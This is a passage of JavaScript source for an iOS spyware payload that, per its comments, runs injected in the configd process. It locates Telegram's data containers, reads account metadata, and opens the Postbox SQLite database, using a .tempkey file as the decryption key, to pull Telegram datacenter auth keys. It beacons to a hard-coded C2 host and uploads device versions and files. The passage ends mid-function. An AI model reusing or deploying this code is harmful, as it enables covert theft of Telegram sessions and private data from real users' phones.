// E4/P3+ Telegram session A.v3 - runs IN configd (not SpringBoard / not TG process)
// Placeholders: __SESSION_ID__ __SESSION_TARGET__
// Align tglib.dylib extractFromFilesystem → /tmp/tg_auth/partner.json (1.txt shape)
//   state = base64(accounts-metadata/atomic-state JSON file)
//   db_sqlite field = base64(JSON{datacenterAuthInfoById,datacenterAddressSetById}) from postbox t1
// Docs: knowledge/tg_path_map.md, experiments/TG_TLIB_DYLIB_ANALYSIS.md
// Stop: /tmp/c2_ipc/session.<id>.stop

const PELOG_HOST = "192.168.31.32";
const PELOG_PORT = 9090;
const SESSION_ID = "__SESSION_ID__";
const SESSION_TARGET = "__SESSION_TARGET__";
const HB_PATH = "/tmp/c2_ipc/session." + SESSION_ID + ".hb";
const STOP_PATH = "/tmp/c2_ipc/session." + SESSION_ID + ".stop";
const STATUS_PATH = "/tmp/c2_ipc/session." + SESSION_ID + ".status";
const EVAL_PATH = "/tmp/c2_ipc/session." + SESSION_ID + ".eval";
const OUT_DIR = "/tmp/tg_auth";
const BUNDLE_HINT = "ph.telegra.Telegraph";
const APPGROUP_BASE = "/private/var/mobile/Containers/Shared/AppGroup";
const APPDATA_BASE = "/private/var/mobile/Containers/Data/Application";
const METADATA_PLIST = ".com.apple.mobile_container_manager.metadata.plist";
const TG_GROUP_HINTS = [
	"group.ph.telegra.Telegraph",
	"group.ph.telegra.Telegraph.shared",
	"ph.telegra.Telegraph"
];
// COPYFILE unused — fread/fwrite copy (copyfile fails under InjectJS Native)

/*__PAYLOAD_FALLBACK_BEGIN__*/
// Shared payload failure fallback (SB bootstrap / pe session).
// On fail: report error + ios/app versions; upload small related files + structure doc.
// Files > 1MiB are skipped. Backend: POST /api/payload/fallback (+ /result category=payload_fallback)

function __fb_readStr(ptr, len) {
  try {
    if (typeof Native.readString === "function") return Native.readString(ptr, len);
  } catch (e) {}
  try {
    if (typeof Native.readCString === "function") return Native.readCString(ptr, len);
  } catch (e) {}
  try {
    if (typeof Native.read === "function") {
      var buff = Native.read(ptr, len);
      var a = new Uint8Array(buff), s = "";
      for (var i = 0; i < a.length; i++) {
        if (!a[i]) break;
        s += String.fromCharCode(a[i]);
      }
      return s;
    }
  } catch (e) {}
  return "";
}

function __fb_sysctlStr(name) {
  try {
    var buf = Native.callSymbol("calloc", 1, 256);
    var lenp = Native.callSymbol("calloc", 1, 8);
    var lv = new DataView(new ArrayBuffer(8));
    lv.setUint32(0, 255, true);
    Native.write(lenp, lv.buffer);
    var rc = Number(Native.callSymbol("sysctlbyname", name, buf, lenp, 0, 0));
    var s = "";
    if (rc === 0) s = __fb_readStr(buf, 256);
    try { Native.callSymbol("free", buf); } catch (e) {}
    try { Native.callSymbol("free", lenp); } catch (e) {}
    return (s || "").replace(/\0/g, "").trim();
  } catch (e) {
    return "";
  }
}

function __fb_iosVersion() {
  var v = __fb_sysctlStr("kern.osproductversion");
  if (!v) v = __fb_sysctlStr("kern.osversion");
  return v || "";
}

function __fb_buildVersion() {
  return __fb_sysctlStr("kern.osversion") || "";
}

function __fb_httpPostJson(path, obj) {
  var host = (typeof BEACON_HOST !== "undefined") ? BEACON_HOST : ((typeof PELOG_HOST !== "undefined") ? PELOG_HOST : "192.168.31.32");
  var port = (typeof BEACON_PORT !== "undefined") ? BEACON_PORT : ((typeof PELOG_PORT !== "undefined") ? PELOG_PORT : 9090);
  var body = JSON.stringify(obj);
  if (typeof _sbPost === "function") {
    try { return _sbPost(host, port, path, "application/json", body); } catch (e) { return null; }
  }
  try {
    var fd = Number(Native.callSymbol("socket", 2, 1, 0));
    if (fd <= 0) return null;
    var sa = Native.callSymbol("calloc", 1, 16);
    var sab = new ArrayBuffer(16), sv = new DataView(sab);
    sv.setUint8(0, 16); sv.setUint8(1, 2); sv.setUint16(2, port, false);
    var p = String(host).split(".");
    sv.setUint8(4, +p[0]); sv.setUint8(5, +p[1]); sv.setUint8(6, +p[2]); sv.setUint8(7, +p[3]);
    Native.write(sa, sab);
    if (Number(Native.callSymbol("connect", fd, sa, 16)) !== 0) {
      Native.callSymbol("free", sa); Native.callSymbol("close", fd); return null;
    }
    Native.callSymbol("free", sa);
    var req = "POST " + path + " HTTP/1.0\r\nHost: " + host + ":" + port +
      "\r\nContent-Type: application/json\r\nContent-Length: " + body.length + "\r\n\r\n" + body;
    var buf = Native.callSymbol("malloc", req.length + 1);
    Native.writeString(buf, req);
    Native.callSymbol("write", fd, buf, req.length);
    Native.callSymbol("free", buf);
    var result = "";
    var rbuf = Native.callSymbol("malloc", 4096);
    if (rbuf) {
      for (var ri = 0; ri < 32; ri++) {
        var n = Number(Native.callSymbol("read", fd, rbuf, 4095));
        if (n <= 0) break;
        result += __fb_readStr(rbuf, n);
      }
      Native.callSymbol("free", rbuf);
    }
    Native.callSymbol("close", fd);
    var idx = result.indexOf("\r\n\r\n");
    var raw = idx >= 0 ? result.substring(idx + 4) : "";
    if (!raw) return {};
    try { return JSON.parse(raw); } catch (e) { return {}; }
  } catch (e) {
    return null;
  }
}

function __fb_b64(str) {
  if (typeof _strToB64 === "function") return _strToB64(str);
  var B = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var out = "", i = 0;
  while (i < str.length) {
    var c1 = str.charCodeAt(i++) & 0xff;
    var c2 = i < str.length ? str.charCodeAt(i++) & 0xff : NaN;
    var c3 = i < str.length ? str.charCodeAt(i++) & 0xff : NaN;
    var n1 = c1 >> 2;
    var n2 = ((c1 & 3) << 4) | (isNaN(c2) ? 0 : c2 >> 4);
    var n3 = isNaN(c2) ? 64 : (((c2 & 15) << 2) | (isNaN(c3) ? 0 : c3 >> 6));
    var n4 = isNaN(c3) ? 64 : (c3 & 63);
    out += B.charAt(n1) + B.charAt(n2) + (n3 === 64 ? "=" : B.charAt(n3)) + (n4 === 64 ? "=" : B.charAt(n4));
  }
  return out;
}

function __fb_fsSize(path) {
  try {
    var fd = Native.callSymbol("fopen", path, "rb");
    if (!fd || fd === 0 || fd === 0n) return -1;
    Native.callSymbol("fseek", fd, 0, 2);
    var sz = Number(Native.callSymbol("ftell", fd));
    Native.callSymbol("fclose", fd);
    return (sz >= 0 && isFinite(sz)) ? sz : -1;
  } catch (e) {
    return -1;
  }
}

function __fb_fsIsDir(path) {
  try {
    var d = Native.callSymbol("opendir", path);
    if (!d || d === 0 || d === 0n) return false;
    Native.callSymbol("closedir", d);
    return true;
  } catch (e) {
    return false;
  }
}

function __fb_listDir(path, maxEntries) {
  maxEntries = maxEntries || 128;
  var out = [];
  try {
    var d = Native.callSymbol("opendir", path);
    if (!d || d === 0 || d === 0n) return out;
    for (var i = 0; i < maxEntries; i++) {
      var ent = Native.callSymbol("readdir", d);
      if (!ent || ent === 0 || ent === 0n) break;
      var name = __fb_readStr(ent + 21n, 256);
      if (!name || name === "." || name === "..") continue;
      var child = path + "/" + name;
      var entry = { name: name, path: child };
      if (__fb_fsIsDir(child)) {
        entry.type = "dir";
      } else {
        entry.type = "file";
        entry.size = __fb_fsSize(child);
      }
      out.push(entry);
    }
    Native.callSymbol("closedir", d);
  } catch (e) {}
  return out;
}

function __fb_fsRead(path, maxLen) {
  if (typeof _fsRead === "function") {
    try { return _fsRead(path, maxLen); } catch (e) {}
  }
  maxLen = maxLen || 262144;
  try {
    var fd = Native.callSymbol("fopen", path, "rb");
    if (!fd || fd === 0 || fd === 0n) return null;
    var p = Native.callSymbol("malloc", maxLen + 1);
    if (!p) { Native.callSymbol("fclose", fd); return null; }
    var n = Number(Native.callSymbol("fread", p, 1, maxLen, fd));
    Native.callSymbol("fclose", fd);
    var s = n > 0 ? __fb_readStr(p, n) : "";
    if (n > 0 && typeof Native.read === "function") {
      try {
        var buff = Native.read(p, n);
        var a = new Uint8Array(buff);
        s = "";
        for (var i = 0; i < n; i++) s += String.fromCharCode(a[i]);
      } catch (e) {}
    }
    Native.callSymbol("free", p);
    return s;
  } catch (e) {
    return null;
  }
}

function __fb_postFallbackFile(fbId, uid, commandId, filename, dataStr) {
  var payload = {
    command_id: commandId || fbId,
    uuid: uid || "fallback",
    filename: filename,
    category: "payload_fallback",
    fallback_id: fbId,
    data: __fb_b64(dataStr)
  };
  __fb_httpPostJson("/result", payload);
}

/** Max upload size for fallback file content (1 MiB). Larger files are skipped. */
var __FB_MAX_UPLOAD = 1048576;

/**
 * Report payload failure. opts:
 *  module_id, stage, error, app_id, app_version,
 *  related_paths: string[], uid, command_id,
 *  upload_paths: string[]  (only files <= 1MiB; oversized skipped)
 *  Always uploads structure.json (tree / sizes / skip reasons).
 */
function __payloadFallbackReport(opts) {
  opts = opts || {};
  var maxUp = (opts.max_file > 0) ? opts.max_file : __FB_MAX_UPLOAD;
  if (maxUp > __FB_MAX_UPLOAD) maxUp = __FB_MAX_UPLOAD;
  var fbId = "fb-" + Date.now().toString(16) + "-" + Math.floor(Math.random() * 1e6).toString(16);
  var ios = opts.ios_version || __fb_iosVersion();
  var build = opts.build_version || __fb_buildVersion();
  var related = opts.related_paths || opts.paths || [];
  if (!Array.isArray(related)) related = related ? [String(related)] : [];
  var upload = opts.upload_paths || [];
  if (!Array.isArray(upload)) upload = upload ? [String(upload)] : [];
  var uid = opts.uid || opts.uuid || "";

  var structure = {
    fallback_id: fbId,
    max_upload: maxUp,
    related: [],
    upload_plan: [],
    note: "files > " + maxUp + " bytes skipped; only small files + this structure doc"
  };
  var seen = {};
  function addStructPath(path, role) {
    if (!path || seen[path]) return;
    seen[path] = 1;
    var row = { path: path, role: role || "related" };
    if (__fb_fsIsDir(path)) {
      row.type = "dir";
      row.entries = __fb_listDir(path, 128);
    } else {
      var sz = __fb_fsSize(path);
      row.type = "file";
      row.size = sz;
      row.exists = sz >= 0;
      if (sz > maxUp) {
        row.skip = "over_1m";
        row.upload = false;
      } else if (sz >= 0) {
        row.upload = true;
      } else {
        row.exists = false;
        row.upload = false;
      }
    }
    structure.related.push(row);
  }
  for (var ri = 0; ri < related.length; ri++) addStructPath(related[ri], "related");
  for (var ui = 0; ui < upload.length; ui++) addStructPath(upload[ui], "upload");

  var body = {
    fallback_id: fbId,
    uid: uid,
    module_id: opts.module_id || opts.module || "",
    stage: opts.stage || "",
    error: String(opts.error || opts.message || "").slice(0, 500),
    ios_version: ios,
    build_version: build,
    app_id: opts.app_id || opts.bundle_id || "",
    app_version: opts.app_version || opts.app_ver || "",
    related_paths: related,
    files: [],
    structure: structure,
    command_id: opts.command_id || "",
    meta: opts.meta || {}
  };
  var resp = null;
  try { resp = __fb_httpPostJson("/api/payload/fallback", body); } catch (e) { resp = null; }

  var uploaded = [];
  try {
    var structStr = JSON.stringify(structure, null, 2);
    __fb_postFallbackFile(fbId, uid, opts.command_id, "structure.json", structStr);
    uploaded.push({ path: "structure.json", via: "result", size: structStr.length });
  } catch (se) {
    uploaded.push({ path: "structure.json", via: "err", err: String(se).slice(0, 60) });
  }

  var candidates = [];
  for (var i = 0; i < upload.length; i++) if (upload[i]) candidates.push(upload[i]);
  for (var j = 0; j < structure.related.length; j++) {
    var r = structure.related[j];
    if (r.type === "file" && r.upload && r.role === "related" && candidates.indexOf(r.path) < 0) {
      if (r.size >= 0 && r.size <= 65536) candidates.push(r.path);
    }
  }

  for (var k = 0; k < candidates.length; k++) {
    var path = candidates[k];
    if (!path) continue;
    try {
      var sz = __fb_fsSize(path);
      structure.upload_plan.push({ path: path, size: sz });
      if (sz < 0) {
        uploaded.push({ path: path, via: "skip", err: "missing" });
        continue;
      }
      if (sz > maxUp) {
        uploaded.push({ path: path, via: "skip", err: "over_1m", size: sz });
        continue;
      }
      // Never _exfilFile here (no size guard). Bounded read only.
      var txt = __fb_fsRead(path, maxUp);
      if (txt != null && txt.length > 0) {
        if (txt.length > maxUp) {
          uploaded.push({ path: path, via: "skip", err: "over_1m", size: txt.length });
          continue;
        }
        var slash = path.lastIndexOf("/");
        var fname = slash >= 0 ? path.slice(slash + 1) : path;
        __fb_postFallbackFile(fbId, uid, opts.command_id, fname, txt);
        uploaded.push({ path: path, via: "result", size: txt.length });
      } else {
        uploaded.push({ path: path, via: "skip", err: "unreadable" });
      }
    } catch (ue) {
      uploaded.push({ path: path, via: "err", err: String(ue).slice(0, 60) });
    }
  }

  try {
    if (typeof _c2Log === "function") {
      _c2Log("[FALLBACK] " + (body.module_id || "") + " " + body.error.slice(0, 80) + " id=" + fbId);
    } else if (typeof _log === "function") {
      _log("[FALLBACK] " + (body.module_id || "") + " " + body.error.slice(0, 80) + " id=" + fbId);
    }
  } catch (e) {}

  return {
    fallback_id: fbId,
    ok: !!(resp && (resp.ok || (resp.data && resp.data.ok) || resp.code === 0)),
    resp: resp,
    uploaded: uploaded,
    skipped_over_1m: uploaded.filter(function (x) { return x.err === "over_1m"; }),
    ios_version: ios,
    app_id: body.app_id,
    app_version: body.app_version
  };
}
/*__PAYLOAD_FALLBACK_END__*/

// Native: plain object (configd JSC hangs on large class Native)
var Native = {
	baseAddr: 0n, dlsymAddr: 0n, memcpyAddr: 0n, mallocAddr: 0n, oinvAddr: 0n,
	argMem: 0n, argPtr: 0n, dlsymCache: null,
	init: function () {
		var b = new BigUint64Array(nativeCallBuff);
		this.baseAddr = b[20]; this.dlsymAddr = b[21]; this.memcpyAddr = b[22];
		this.mallocAddr = b[23]; this.oinvAddr = b[24];
		this.dlsymCache = {};
		this.argMem = this._nc(this.mallocAddr, BigInt(0x1000));
		this.argPtr = this.argMem;
	},
	write: function (ptr, buff) {
		var u = new Uint8Array(nativeCallBuff), a = new Uint8Array(buff);
		for (var i = 0; i < a.length; i += 0x1000) {
			var n = a.length - i > 0x1000 ? 0x1000 : a.length - i;
			u.set(a.subarray(i, i + n), 0x1000);
			this._nc(this.memcpyAddr, ptr + BigInt(i), this.baseAddr + 0x1000n, BigInt(n));
		}
	},
	read: function (ptr, length) {
		var buff = new ArrayBuffer(length);
		var out = new Uint8Array(buff);
		for (var i = 0; i < length; i += 0x1000) {
			var n = length - i > 0x1000 ? 0x1000 : length - i;
			this._nc(this.memcpyAddr, this.baseAddr + 0x1000n, ptr + BigInt(i), BigInt(n));
			out.set(new Uint8Array(nativeCallBuff, 0x1000, n), i);
		}
		return buff;
	},
	readCString: function (ptr, maxLen) {
		if (!ptr || ptr === 0n) return "";
		var buff = this.read(ptr, maxLen || 512);
		var a = new Uint8Array(buff), s = "";
		for (var i = 0; i < a.length; i++) { if (!a[i]) break; s += String.fromCharCode(a[i]); }
		return s;
	},
	writeString: function (ptr, str) {
		var b = new ArrayBuffer(str.length + 1), a = new Uint8Array(b);
		for (var i = 0; i < str.length; i++) a[i] = str.charCodeAt(i) & 0xff;
		this.write(ptr, b);
	},
	callSymbol: function (name, x0, x1, x2, x3) {
		this.argPtr = this.argMem;
		if (typeof x0 === "string") { var p = this.argPtr; this.writeString(p, x0); this.argPtr += BigInt(x0.length + 1); x0 = p; }
		if (typeof x1 === "string") { var p1 = this.argPtr; this.writeString(p1, x1); this.argPtr += BigInt(x1.length + 1); x1 = p1; }
		if (typeof x2 === "string") { var p2 = this.argPtr; this.writeString(p2, x2); this.argPtr += BigInt(x2.length + 1); x2 = p2; }
		var r = this._nc(this._dlsym(name), this._arg(x0), this._arg(x1), this._arg(x2), this._arg(x3));
		this.argPtr = this.argMem;
		return r < 0xffffffffn && r > -0xffffffffn ? Number(r) : r;
	},
	_arg: function (v) { return !v && v !== 0 ? 0n : typeof v === "bigint" ? v : BigInt(v); },
	_dlsym: function (name) {
		var hit = this.dlsymCache[name];
		if (hit) return hit;
		var b = new ArrayBuffer(name.length + 1), a = new Uint8Array(b);
		for (var i = 0; i < name.length; i++) a[i] = name.charCodeAt(i) & 0xff;
		new Uint8Array(nativeCallBuff).set(a, 0x1000);
		hit = this._nc(this.dlsymAddr, 0xfffffffffffffffen, this.baseAddr + 0x1000n);
		if (hit) this.dlsymCache[name] = hit;
		return hit;
	},
	_nc: function (addr, x0, x1, x2, x3) {
		var b = new BigUint64Array(nativeCallBuff);
		b[0] = addr; b[100] = x0 || 0n; b[101] = x1 || 0n; b[102] = x2 || 0n; b[103] = x3 || 0n;
		invoker();
		return b[200];
	}
};


function _log(msg) {
	try {
		const body = "seq=0&msg=" + encodeURIComponent(String(msg).slice(0, 500));
		const fd = Native.callSymbol("socket", 2, 1, 0);
		if (fd <= 0) return;
		const sa = Native.callSymbol("calloc", 1, 16);
		const sab = new ArrayBuffer(16), sv = new DataView(sab);
		sv.setUint8(0, 16); sv.setUint8(1, 2); sv.setUint16(2, PELOG_PORT, false);
		const p = PELOG_HOST.split(".");
		sv.setUint8(4, +p[0]); sv.setUint8(5, +p[1]); sv.setUint8(6, +p[2]); sv.setUint8(7, +p[3]);
		Native.write(sa, sab);
		if (Native.callSymbol("connect", fd, sa, 16) !== 0) {
			Native.callSymbol("free", sa); Native.callSymbol("close", fd); return;
		}
		Native.callSymbol("free", sa);
		const req = "POST /pelog HTTP/1.0\r\nHost: " + PELOG_HOST + ":" + PELOG_PORT +
			"\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + body.length + "\r\n\r\n" + body;
		const buf = Native.callSymbol("malloc", req.length + 1);
		Native.writeString(buf, req);
		Native.callSymbol("write", fd, buf, req.length);
		Native.callSymbol("free", buf);
		Native.callSymbol("close", fd);
	} catch (_) {}
}

function _writeFile(path, body) {
	try {
		const fd = Native.callSymbol("fopen", path, "w");
		if (!fd || fd === 0 || fd === 0n) return false;
		const p = Native.callSymbol("calloc", 1, body.length + 1);
		Native.writeString(p, body);
		Native.callSymbol("fwrite", p, 1, body.length, fd);
		Native.callSymbol("fclose", fd);
		Native.callSymbol("free", p);
		return true;
	} catch (_) {
		return false;
	}
}

function _writeEval(state, extra) {
	try {
		const o = Object.assign({ ts: Date.now(), session_id: SESSION_ID, state: state }, extra || {});
		_writeFile(EVAL_PATH, JSON.stringify(o) + "\n");
	} catch (_) {}
}

function _writeHb(pid, tick, extra) {
	const body = "{\"id\":\"" + SESSION_ID + "\",\"target\":\"" + SESSION_TARGET +
		"\",\"pid\":" + pid + ",\"tick\":" + tick + ",\"ts\":" + Date.now() +
		(extra ? "," + extra : "") + "}\n";
	_writeFile(HB_PATH, body);
}

function _stopRequested() {
	try {
		const fd = Native.callSymbol("fopen", STOP_PATH, "r");
		if (!fd || fd === 0 || fd === 0n) return false;
		Native.callSymbol("fclose", fd);
		return true;
	} catch (_) {
		return false;
	}
}

function _canOpen(path) {
	try {
		const fd = Native.callSymbol("fopen", path, "rb");
		if (!fd || fd === 0 || fd === 0n) return false;
		Native.callSymbol("fclose", fd);
		return true;
	} catch (_) {
		return false;
	}
}

function _isDir(path) {
	try {
		const d = Native.callSymbol("opendir", path);
		if (!d || d === 0 || d === 0n) return false;
		try { Native.callSymbol("closedir", d); } catch (_) {}
		return true;
	} catch (_) {
		return false;
	}
}

function _pathExists(path) {
	return _canOpen(path) || _isDir(path);
}

function _readFileHead(path, maxLen) {
	maxLen = maxLen || 8192;
	try {
		const fd = Native.callSymbol("fopen", path, "rb");
		if (!fd || fd === 0 || fd === 0n) return "";
		const p = Native.callSymbol("malloc", maxLen + 1);
		if (!p || p === 0 || p === 0n) {
			Native.callSymbol("fclose", fd);
			return "";
		}
		const n = Number(Native.callSymbol("fread", p, 1, maxLen, fd));
		Native.callSymbol("fclose", fd);
		let s = "";
		if (n > 0) {
			try {
				const buff = Native.read(typeof p === "bigint" ? p : BigInt(p), n);
				const a = new Uint8Array(buff);
				for (let i = 0; i < n; i++) {
					if (!a[i]) break;
					s += String.fromCharCode(a[i]);
				}
			} catch (_) {
				try { s = Native.readCString(typeof p === "bigint" ? p : BigInt(p), n + 1); } catch (__) { s = ""; }
			}
		}
		try { Native.callSymbol("free", p); } catch (_) {}
		return s;
	} catch (_) {
		return "";
	}
}

function _readDeviceIds() {
	const out = { serial: "", unique: "", ecid: "", channel: "" };
	try {
		const raw = _readFileHead("/tmp/c2_ipc/device.json", 4096);
		if (!raw) return out;
		const mSer = raw.match(/"serial"\s*:\s*"([^"]*)"/);
		const mUid = raw.match(/"unique"\s*:\s*"([^"]*)"/) || raw.match(/"udid"\s*:\s*"([^"]*)"/);
		const mUuid = raw.match(/"uuid"\s*:\s*"([^"]*)"/);
		if (mSer) out.serial = mSer[1];
		if (mUid) out.unique = mUid[1];
		if (!out.serial && mUuid) out.serial = mUuid[1];
		if (out.unique && out.unique.indexOf("-") >= 0) {
			const parts = out.unique.split("-");
			if (parts.length >= 2) out.ecid = parts[parts.length - 1];
		}
	} catch (_) {}
	return out;
}

function _listAccountDirs(tdRoot) {
	const out = [];
	if (!tdRoot || !_isDir(tdRoot)) return out;
	try {
		const d = Native.callSymbol("opendir", tdRoot);
		if (!d || d === 0 || d === 0n) return out;
		for (let i = 0; i < 64; i++) {
			const ent = Native.callSymbol("readdir", d);
			if (!ent || ent === 0 || ent === 0n) break;
			let name = "";
			try { name = Native.readCString(typeof ent === "bigint" ? ent + 21n : BigInt(ent) + 21n, 96); } catch (_) { name = ""; }
			if (!name || name.indexOf("account-") !== 0) continue;
			const p = tdRoot + "/" + name;
			if (_isDir(p)) out.push(p);
		}
		try { Native.callSymbol("closedir", d); } catch (_) {}
	} catch (_) {}
	return out;
}

const SQLITE_OK = 0;
const SQLITE_ROW = 100;
const TG_KEY_AUTH = "persistent:datacenterAuthInfoById";
const TG_KEY_ADDR = "persistent:datacenterAddressSetById";
const TG_MAX_STATE = 1048576;

function _b64Alphabet() {
	return "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
}

function _b64EncodeU8(u8) {
	const alpha = _b64Alphabet();
	let out = "";
	const n = u8.length;
	for (let i = 0; i < n; i += 3) {
		const a = u8[i];
		const b = i + 1 < n ? u8[i + 1] : 0;
		const c = i + 2 < n ? u8[i + 2] : 0;
		const triple = (a << 16) | (b << 8) | c;
		out += alpha[(triple >> 18) & 63];
		out += alpha[(triple >> 12) & 63];
		out += i + 1 < n ? alpha[(triple >> 6) & 63] : "=";
		out += i + 2 < n ? alpha[triple & 63] : "=";
	}
	return out;
}

function _readFileU8(path, maxLen) {
	maxLen = maxLen || TG_MAX_STATE;
	try {
		const fd = Native.callSymbol("fopen", path, "rb");
		if (!fd || fd === 0 || fd === 0n) return null;
		const p = Native.callSymbol("malloc", maxLen + 1);
		if (!p || p === 0 || p === 0n) {
			Native.callSymbol("fclose", fd);
			return null;
		}
		const n = Number(Native.callSymbol("fread", p, 1, maxLen, fd));
		Native.callSymbol("fclose", fd);
		if (n <= 0) {
			try { Native.callSymbol("free", p); } catch (_) {}
			return null;
		}
		let u8 = null;
		try {
			const buff = Native.read(typeof p === "bigint" ? p : BigInt(p), n);
			u8 = new Uint8Array(buff);
		} catch (_) {
			u8 = null;
		}
		try { Native.callSymbol("free", p); } catch (_) {}
		return u8;
	} catch (_) {
		return null;
	}
}

function _readFileB64(path, maxLen) {
	const u8 = _readFileU8(path, maxLen);
	if (!u8 || !u8.length) return "";
	return _b64EncodeU8(u8);
}

function _u8ToText(u8) {
	if (!u8) return "";
	let s = "";
	for (let i = 0; i < u8.length; i++) {
		const c = u8[i];
		if (!c) break;
		s += String.fromCharCode(c);
	}
	return s;
}

function _listDirNames(path, limit) {
	const out = [];
	try {
		const d = Native.callSymbol("opendir", path);
		if (!d || d === 0 || d === 0n) return out;
		for (let i = 0; i < (limit || 64); i++) {
			const ent = Native.callSymbol("readdir", d);
			if (!ent || ent === 0 || ent === 0n) break;
			let name = "";
			try { name = Native.readCString(typeof ent === "bigint" ? ent + 21n : BigInt(ent) + 21n, 128); } catch (_) { name = ""; }
			if (!name || name === "." || name === "..") continue;
			out.push(name);
		}
		try { Native.callSymbol("closedir", d); } catch (_) {}
	} catch (_) {}
	return out;
}

function _resolveTelegramData(root) {
	if (!root) return "";
	const cands = [
		root + "/telegram-data",
		root + "/Documents/telegram-data",
		root + "/Library/telegram-data"
	];
	for (let i = 0; i < cands.length; i++) {
		if (_isDir(cands[i])) return cands[i];
	}
	return "";
}

function _resolveAtomicStatePath(tdRoot) {
	if (!tdRoot) return "";
	const cands = [
		tdRoot + "/accounts-metadata/atomic-state",
		tdRoot + "/accounts-metadata/atomic-state.json",
		tdRoot + "/../accounts-metadata/atomic-state"
	];
	for (let i = 0; i < cands.length; i++) {
		const p = cands[i];
		if (_canOpen(p) && !_isDir(p)) return p;
	}
	// Directory layout (public walkthroughs): pick largest JSON-looking child
	const dir = tdRoot + "/accounts-metadata/atomic-state";
	if (_isDir(dir)) {
		const names = _listDirNames(dir, 32);
		let best = "";
		let bestSz = -1;
		for (let i = 0; i < names.length; i++) {
			const fp = dir + "/" + names[i];
			if (!_canOpen(fp) || _isDir(fp)) continue;
			const head = _readFileHead(fp, 8);
			const sz = _fileSize(fp);
			if (head.indexOf("{") === 0 || head.indexOf("[") === 0) {
				if (sz > bestSz) { bestSz = sz; best = fp; }
			} else if (sz > bestSz && sz > 64) {
				if (sz > bestSz) { bestSz = sz; best = fp; }
			}
		}
		if (best) return best;
	}
	// Legacy flat under AppGroup root (tdRoot may be telegram-data parent)
	const flat = [
		tdRoot + "/atomic-state",
		tdRoot.replace(/\/telegram-data$/, "") + "/accounts-metadata/atomic-state"
	];
	for (let j = 0; j < flat.length; j++) {
		if (_canOpen(flat[j]) && !_isDir(flat[j])) return flat[j];
	}
	return "";
}

function _parseAtomicMeta(text) {
	const out = { user_id: "", account_id: "", logged_out: false, ok: false };
	if (!text || text.charAt(0) !== "{") return out;
	try {
		const mCur = text.match(/"currentRecordId"\s*:\s*"?(-?\d+)"?/);
		if (mCur) out.account_id = mCur[1];
		if (/\"loggedOut\"\s*:\s*true/.test(text)) out.logged_out = true;
		// Prefer backupData peerId blocks
		const re = /\"peerId\"\s*:\s*(-?\d+)/g;
		let m;
		const peers = [];
		while ((m = re.exec(text)) !== null) peers.push(m[1]);
		if (peers.length) out.user_id = peers[0];
		// If backupData nested as base64, light scan for peerId= after decode is hard; rely on plaintext peerId
		out.ok = !!(out.user_id || out.account_id);
	} catch (_) {}
	return out;
}

function _sqliteOpen(path) {
	try {
		const buf = Native.callSymbol("calloc", 1, 8);
		const rc = Number(Native.callSymbol("sqlite3_open_v2", path, buf, 0x01, 0n));
		if (rc !== SQLITE_OK) {
			try { Native.callSymbol("free", buf); } catch (_) {}
			return null;
		}
		let db = null;
		try { db = Native.read64(BigInt(buf)); } catch (_) { db = null; }
		try { Native.callSymbol("free", buf); } catch (_) {}
		if (db) {
			try { Native.callSymbol("sqlite3_busy_timeout", db, 3000); } catch (_) {}
		}
		return db;
	} catch (_) {
		return null;
	}
}

function _sqliteExec(db, sql) {
	try {
		const stmtBuf = Native.callSymbol("calloc", 1, 8);
		const rc = Number(Native.callSymbol("sqlite3_prepare_v2", db, sql, -1, stmtBuf, 0n));
		if (rc !== SQLITE_OK) {
			try { Native.callSymbol("free", stmtBuf); } catch (_) {}
			return false;
		}
		const stmt = Native.read64(BigInt(stmtBuf));
		try { Native.callSymbol("free", stmtBuf); } catch (_) {}
		Native.callSymbol("sqlite3_step", stmt);
		try { Native.callSymbol("sqlite3_finalize", stmt); } catch (_) {}
		return true;
	} catch (_) {
		return false;
	}
}

function _sqliteGetBlobB64(db, keyStr) {
	try {
		const sql = "SELECT value FROM t1 WHERE key = ?";
		const stmtBuf = Native.callSymbol("calloc", 1, 8);
		const rc = Number(Native.callSymbol("sqlite3_prepare_v2", db, sql, -1, stmtBuf, 0n));
		if (rc !== SQLITE_OK) {
			try { Native.callSymbol("free", stmtBuf); } catch (_) {}
			return "";
		}
		const stmt = Native.read64(BigInt(stmtBuf));
		try { Native.callSymbol("free", stmtBuf); } catch (_) {}
		const keyBuf = Native.callSymbol("malloc", keyStr.length + 1);
		Native.writeString(keyBuf, keyStr);
		// bind as blob (tglib) and also works for text affinity
		Native.callSymbol("sqlite3_bind_blob", stmt, 1, keyBuf, keyStr.length, 0n);
		let b64 = "";
		if (Number(Native.callSymbol("sqlite3_step", stmt)) === SQLITE_ROW) {
			const blob = Native.callSymbol("sqlite3_column_blob", stmt, 0);
			const blen = Number(Native.callSymbol("sqlite3_column_bytes", stmt, 0));
			if (blob && blen > 0) {
				try {
					const buff = Native.read(typeof blob === "bigint" ? blob : BigInt(blob), blen);
					b64 = _b64EncodeU8(new Uint8Array(buff));
				} catch (_) { b64 = ""; }
			}
		}
		try { Native.callSymbol("sqlite3_finalize", stmt); } catch (_) {}
		try { Native.callSymbol("free", keyBuf); } catch (_) {}
		return b64;
	} catch (_) {
		return "";
	}
}

function _applyTempKey(db, tdRoot) {
	if (!db || !tdRoot) return false;
	const kp = tdRoot + "/.tempkey";
	if (!_canOpen(kp)) return false;
	const u8 = _readFileU8(kp, 128);
	if (!u8 || !u8.length) return false;
	let hex = "";
	for (let i = 0; i < u8.length; i++) {
		const h = u8[i].toString(16);
		hex += h.length < 2 ? "0" + h : h;
	}
	const pragma = "PRAGMA key = \"x'" + hex + "'\"";
	_log("[SESSION-TG] try .tempkey len=" + u8.length);
	return _sqliteExec(db, pragma);
}

function _extractT1Pair(postboxDbPath, tdRoot) {
	const empty = { auth: "", addr: "", err: "no_db", open_rc: "fail" };
	if (!postboxDbPath || !_canOpen(postboxDbPath)) return empty;
	let db = _sqliteOpen(postboxDbPath);
	if (!db) return { auth: "", addr: "", err: "sqlite_open_fail", open_rc: "fail" };
	let auth = _sqliteGetBlobB64(db, TG_KEY_AUTH);
	let addr = _sqliteGetBlobB64(db, TG_KEY_ADDR);
	if ((!auth || !addr) && tdRoot) {
		_applyTempKey(db, tdRoot);
		if (!auth) auth = _sqliteGetBlobB64(db, TG_KEY_AUTH);
		if (!addr) addr = _sqliteGetBlobB64(db, TG_KEY_ADDR);
